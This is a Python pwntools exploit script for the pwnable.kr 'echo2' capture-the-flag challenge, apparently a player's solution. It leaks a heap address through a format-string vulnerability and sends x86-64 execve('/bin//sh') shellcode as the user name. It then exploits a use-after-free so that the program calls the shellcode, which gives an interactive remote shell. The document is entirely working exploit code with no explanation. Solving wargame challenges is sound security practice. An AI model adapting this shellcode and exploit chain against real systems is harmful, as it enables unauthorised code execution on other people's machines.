from pwn import *
target = "./echo2"
target = ("pwnable.kr", 9011)
local = False
context(arch = "amd64", os = 'linux')

def get_io(target, local = True):
	if local:
		ELF(target)
		io = process(target, timeout = 9999)
	else:
		ELF("./echo2")
		io = remote(target[0], target[1])
	return io

def generate_buff(size, b_pos):
	index = b_pos
	buff = ""
	while True:
		c_str = "%" + "%d$p."%index
		if len(c_str) + len(buff) > size:
			return buff, index

		buff += c_str
		index += 1

def search_heap(io, heap_addr):
	index = 1
	data = ""
	while index < 200:
		print io.recvuntil("> ")
		io.send("2\n")
		print io.recvuntil("\n")
		buff, index = generate_buff(31, index)
		io.send(buff + "\n")
		data += io.recvuntil("\n").strip("\n")
	for index, item in enumerate(data.strip(".").split(".")):
		if item.find("(nil)") != -1:
			print "%02d : %s"%(index + 1, item)
		else:
			print "%02d : %s->%016x"%(index + 1, item, int(item, 16) - heap_addr)


def leak_heap(io, index):
	print io.recvuntil("> ")
	io.send("2\n")
	print io.recvuntil("\n")
	buff = "%" + "%d$p."%index
	io.send(buff + "\n")
	data = io.recvuntil("\n").strip("\n").strip(".")
	return int(data, 16)


def pwn(io):
	system_addr = p64(0x00)
	print io.recvuntil("hey, what's your name? : ")

	#raw_input(":")
	shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
	shellcode += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

	io.send(shellcode + "\n")


	print io.recvuntil("> ")
	io.send("3\n")
	print io.recvuntil("\n")
	io.send("nihaoa\n")
	print io.recvuntil("\n")

	#addr = int(raw_input("name_addr:"), 16)
	#search_heap(io, addr)
	name_addr = leak_heap(io, 10) - 0x20


	print io.recvuntil("> ")
	io.send("4\n")
	print io.recvuntil("n)")
	print io.send("n\n")

	print io.recvuntil("> ")
	io.send("3\n")
	print io.recvuntil("\n")

	call_addr = p64(name_addr)
	io.send(call_addr * 4)
	io.interactive()

io = get_io(target, local = local)
pwn(io)